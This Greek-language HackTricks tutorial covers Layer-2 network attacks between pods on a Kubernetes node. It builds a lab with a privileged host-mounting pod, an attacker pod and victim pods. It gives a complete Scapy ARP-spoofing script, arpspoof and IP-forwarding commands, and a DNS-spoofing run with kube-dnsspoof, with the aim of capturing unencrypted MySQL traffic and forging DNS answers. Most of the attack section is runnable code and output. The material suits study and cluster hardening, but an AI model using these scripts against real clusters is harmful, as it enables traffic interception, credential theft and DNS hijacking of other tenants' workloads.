# Επιθέσεις Δικτύου στο Kubernetes

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Εισαγωγή

Στο Kubernetes, παρατηρείται ότι η προεπιλεγμένη συμπεριφορά επιτρέπει την εγκαθίδρυση συνδέσεων μεταξύ **όλων των containers που βρίσκονται στον ίδιο κόμβο**. Αυτό ισχύει ανεξάρτητα από τις διακρίσεις των namespaces. Αυτή η συνδεσιμότητα επεκτείνεται μέχρι το **Layer 2** (Ethernet). Ως εκ τούτου, αυτή η διαμόρφωση εκθέτει δυνητικά το σύστημα σε ευπάθειες. Συγκεκριμένα, ανοίγει τη δυνατότητα για ένα **κακόβουλο container** να εκτελέσει μια επίθεση **ARP spoofing** εναντίον άλλων containers που βρίσκονται στον ίδιο κόμβο. Κατά τη διάρκεια μιας τέτοιας επίθεσης, το κακόβουλο container μπορεί να παραπλανήσειτα ή να τροποποιήσει την κίνηση δεδομένων που προορίζεται για άλλα containers.

Οι επιθέσεις ARP spoofing περιλαμβάνουν την **αποστολή πλαστοπροσωπευτικών μηνυμάτων ARP** (Address Resolution Protocol) σε ένα τοπικό δίκτυο. Αυτό έχει ως αποτέλεσμα τη σύνδεση της **MAC διεύθυνσης του επιτιθέμενου με την IP διεύθυνση ενός νόμιμου υπολογιστή ή διακομιστή στο δίκτυο**. Μετά την επιτυχή εκτέλεση μιας τέτοιας επίθεσης, ο επιτιθέμενος μπορεί να παρακολουθεί, να τροποποιεί ή ακόμα και να διακόπτει τα δεδομένα που μεταφέρονται. Η επίθεση εκτελείται στο Layer 2 του μοντέλου OSI, για αυτό και η προεπιλεγμένη συνδεσιμότητα στο Kubernetes σε αυτό το επίπεδο προκαλεί ανησυχίες ασφαλείας.

Στη συγκεκριμένη περίπτωση, θα δημιουργηθούν 4 μηχανές:

* ubuntu-pe: Προνομιούχο μηχάνημα για να δραπετεύσει στον κόμβο και να ελέγξει τις μετρήσεις (δεν απαιτείται για την επίθεση)
* **ubuntu-attack**: **Κακόβουλο** container στο default namespace
* **ubuntu-victim**: Μηχάνημα **θύμα** στο kube-system namespace
* **mysql**: Μηχάνημα **θύμα** στο default namespace
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## Βασική Δικτύωση Kubernetes

Εάν θέλετε περισσότερες λεπτομέρειες για τα θέματα δικτύωσης που παρουσιάζονται εδώ, ανατρέξτε στις αναφορές.

### ARP

Γενικά, η **δικτύωση από pod σε pod μέσα στον κόμβο** είναι διαθέσιμη μέσω ενός **γέφυρας** που συνδέει όλα τα pods. Αυτή η γέφυρα ονομάζεται "**cbr0**". (Ορισμένα πρόσθετα δικτύου θα εγκαταστήσουν τη δική τους γέφυρα.) Η **cbr0 μπορεί επίσης να χειριστεί την ανάλυση ARP** (Address Resolution Protocol). Όταν ένα εισερχόμενο πακέτο φτάνει στη cbr0, μπορεί να αναλύσει τη διεύθυνση MAC προορισμού χρησιμοποιώντας το ARP.

Αυτό το γεγονός σημαίνει ότι, από προεπιλογή, **κάθε pod που εκτελείται στον ίδιο κόμβο** θα μπορεί να **επικοινωνεί** με οποιοδήποτε άλλο pod στον ίδιο κόμβο (ανεξάρτητα από το namespace) σε επίπεδο ethernet (επίπεδο 2).

{% hint style="warning" %}
Επομένως, είναι δυνατή η πραγματοποίηση επιθέσεων **ARP Spoofing μεταξύ pods στον ίδιο κόμβο**.
{% endhint %}

### DNS

Στο περιβάλλον του Kubernetes, συνήθως θα βρείτε 1 (ή περισσότερες) **υπηρεσίες DNS που εκτελούνται** συνήθως στο namespace kube-system:
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
Στις προηγούμενες πληροφορίες μπορείτε να δείτε κάτι ενδιαφέρον, το **IP της υπηρεσίας** είναι **10.96.0.10** αλλά το **IP του pod** που εκτελεί την υπηρεσία είναι **172.17.0.2**.

Εάν ελέγξετε τη διεύθυνση DNS μέσα σε οποιοδήποτε pod, θα βρείτε κάτι τέτοιο:
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
Ωστόσο, το pod **δεν γνωρίζει** πώς να φτάσει σε αυτήν την **διεύθυνση** επειδή το **εύρος του pod** σε αυτήν την περίπτωση είναι 172.17.0.10/26.

Επομένως, το pod θα στείλει τα **αιτήματα DNS στη διεύθυνση 10.96.0.10** τα οποία θα **μεταφραστούν** από το cbr0 **σε** **172.17.0.2**.

{% hint style="warning" %}
Αυτό σημαίνει ότι ένα **αιτήματα DNS** ενός pod θα πάνε πάντα στη **γέφυρα** για να **μεταφραστεί** η **διεύθυνση IP της υπηρεσίας σε διεύθυνση IP τερματικού**, ακόμα κι αν ο διακομιστής DNS βρίσκεται στον ίδιο υποδίκτυο με το pod.

Γνωρίζοντας αυτό και γνωρίζοντας ότι **επιθέσεις ARP είναι δυνατές**, ένα **pod** σε έναν κόμβο θα μπορεί να **παρεμβάλει την κίνηση** μεταξύ **κάθε pod** στο **υποδίκτυο** και της **γέφυρας** και να **τροποποιήσει** τις **απαντήσεις DNS** από τον διακομιστή DNS (**DNS Spoofing**).

Επιπλέον, αν ο **διακομιστής DNS** βρίσκεται στον **ίδιο κόμβο με τον επιτιθέμενο**, ο επιτιθέμενος μπορεί να **παρεμβάλει όλα τα αιτήματα DNS** οποιουδήποτε pod στο cluster (μεταξύ του διακομιστή DNS και της γέφυρας) και να τροποποιήσει τις απαντήσεις.
{% endhint %}

## ARP Spoofing σε pods στον ίδιο κόμβο

Ο στόχος μας είναι να **κλέψουμε τουλάχιστον την επικοινωνία από το ubuntu-victim προς το mysql**.

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof

Η τεχνική ARPSpoof εκμεταλλεύεται το πρωτόκολλο ARP (Address Resolution Protocol) για να παραπλανήσει το δίκτυο και να προωθήσει την κυκλοφορία δεδομένων μέσω του επιθετικού μηχανήματος. Αυτό επιτρέπει στον επιτιθέμενο να παρακολουθεί, να καταγράφει ή ακόμα και να τροποποιεί την κυκλοφορία δεδομένων μεταξύ των θυμάτων στο δίκτυο.

Για να εκτελέσετε την επίθεση ARPSpoof, ακολουθήστε τα παρακάτω βήματα:

1. Ενεργοποιήστε την IP forwarding στο επιθετικό μηχάνημα.
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

2. Χρησιμοποιήστε το εργαλείο `arpspoof` για να παραπλανήσετε το δίκτυο και να ανακατευθύνετε την κυκλοφορία δεδομένων.
```
arpspoof -i <interface> -t <target_ip> <gateway_ip>
```

3. Επαναδρομολογήστε την κυκλοφορία δεδομένων από το επιθετικό μηχάνημα προς τον προορισμό.
```
arpspoof -i <interface> -t <gateway_ip> <target_ip>
```

Με αυτόν τον τρόπο, ο επιτιθέμενος μπορεί να παρακολουθήσει ή να τροποποιήσει την κυκλοφορία δεδομένων μεταξύ των θυμάτων στο δίκτυο.
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Spoofing

Όπως ήδη αναφέρθηκε, αν καταλάβετε ένα pod στον ίδιο κόμβο του pod του DNS server, μπορείτε να κάνετε MitM με το ARPSpoofing στη γέφυρα και το pod του DNS και να τροποποιήσετε όλες τις απαντήσεις DNS.

Έχετε ένα πολύ καλό εργαλείο και οδηγίες για να δοκιμάσετε αυτό στο [https://github.com/danielsagi/kube-dnsspoof/](https://github.com/danielsagi/kube-dnsspoof/)

Στο σενάριό μας, κατεβάστε το εργαλείο στο pod του επιτιθέμενου και δημιουργήστε ένα αρχείο με όνομα `hosts` με τους τομείς που θέλετε να παραπλανήσετε, όπως:
```
cat hosts
google.com. 1.1.1.1
```
Εκτελέστε την επίθεση στη μηχανή ubuntu-victim:
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
Εάν προσπαθήσετε να δημιουργήσετε το δικό σας σενάριο DNS spoofing, αν απλά τροποποιήσετε την απάντηση DNS, αυτό δεν θα λειτουργήσει, επειδή η απάντηση θα έχει μια διεύθυνση IP προέλευσης του κακόβουλου pod και δεν θα γίνει αποδεκτή.\
Θα πρέπει να δημιουργήσετε ένα νέο πακέτο DNS με τη διεύθυνση IP προέλευσης του DNS όπου ο θύτης αποστέλλει το αίτημα DNS (που είναι κάτι σαν 172.16.0.2, όχι 10.96.0.10, αυτή είναι η IP υπηρεσίας DNS του K8s και όχι η IP του διακομιστή DNS, περισσότερα για αυτό στην εισαγωγή).
{% endhint %}

## Καταγραφή Κίνησης

Το εργαλείο [**Mizu**](https://github.com/up9inc/mizu) είναι ένα απλό αλλά ισχυρό πρόγραμμα προβολής κίνησης API για το Kubernetes που σας επιτρέπει να προβάλετε όλη την επικοινωνία API μεταξύ των μικρουπηρεσιών για να σας βοηθήσει να εντοπίσετε σφάλματα και να επιλύσετε προβλήματα.\
Θα εγκαταστήσει πράκτορες στα επιλεγμένα pods και θα συγκεντρώσει τις πληροφορίες κίνησής τους και θα σας τις εμφανίσει σε έναν διακομιστή ιστού. Ωστόσο, θα χρειαστείτε υψηλά δικαιώματα K8s για αυτό (και δεν είναι πολύ αόρατο).

## Αναφορές

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
